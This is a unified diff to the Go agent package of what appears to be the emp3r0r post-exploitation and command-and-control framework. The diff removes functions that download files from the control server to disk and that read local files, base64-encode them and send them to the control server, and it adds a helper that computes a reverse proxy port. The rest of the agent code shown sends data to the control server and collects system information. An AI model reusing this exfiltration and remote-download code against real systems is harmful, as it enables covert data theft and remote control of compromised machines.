@@ -1,18 +1,16 @@
 package agent
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"net"
-	"net/http"
 	"os"
 	"os/user"
 	"runtime"
+	"strconv"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -74,31 +72,6 @@ func Send2CC(data *MsgTunData) error {
 	return nil
 }
 
-// DownloadViaCC download via EmpHTTPClient
-// if path is empty, return []data instead
-func DownloadViaCC(url, path string) (data []byte, err error) {
-	var resp *http.Response
-	resp, err = HTTPClient.Get(url)
-	if err != nil {
-		return
-	}
-	log.Printf("DownloadViaCC: downloading from %s to %s...", url, path)
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("Error, status code %d", resp.StatusCode)
-	}
-
-	data, err = ioutil.ReadAll(resp.Body)
-	defer resp.Body.Close()
-	if err != nil {
-		return
-	}
-
-	if path != "" {
-		return nil, ioutil.WriteFile(path, data, 0600)
-	}
-	return
-}
-
 // CollectSystemInfo build system info object
 func CollectSystemInfo() *SystemInfo {
 	var (
@@ -153,27 +126,14 @@ func CollectSystemInfo() *SystemInfo {
 	return &info
 }
 
-// send local file to CC
-func file2CC(filepath string) (checksum string, err error) {
-	// open and read the target file
-	f, err := os.Open(filepath)
+func calculateReverseProxyPort() string {
+	p, err := strconv.Atoi(ProxyPort)
 	if err != nil {
-		return
-	}
-	bytes, err := ioutil.ReadAll(f)
-	if err != nil {
-		return
-	}
-	checksum = tun.SHA256SumRaw(bytes)
-
-	// base64 encode
-	payload := base64.StdEncoding.EncodeToString(bytes)
-
-	fileData := MsgTunData{
-		Payload: "FILE" + OpSep + filepath + OpSep + payload,
-		Tag:     Tag,
+		log.Printf("WTF? ProxyPort %s: %v", ProxyPort, err)
+		return "22222"
 	}
 
-	// send
-	return checksum, Send2CC(&fileData)
+	// reverseProxyPort
+	rProxyPortInt := p + 1
+	return strconv.Itoa(rProxyPortInt)
 }
